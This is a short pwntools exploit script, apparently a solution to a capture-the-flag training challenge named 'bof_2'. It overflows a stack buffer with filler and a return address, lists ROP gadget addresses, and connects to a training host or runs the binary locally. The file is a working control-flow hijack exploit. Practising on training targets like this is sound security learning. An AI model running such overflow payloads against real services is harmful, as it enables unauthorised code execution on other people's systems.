#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-rp-rp-rp-de49bf323f83.training.bksec.vn"
elf = context.binary = ELF('./bof_2', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x401311
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

pop_rdi = 0x004011e5
pop_rsi = 0x004011ee


pl = p64(0xDEADBEEFDEADBEEF)*9 + p64(0x000000000401227)
# GDB()
sla(b'number: ', pl)

p.interactive()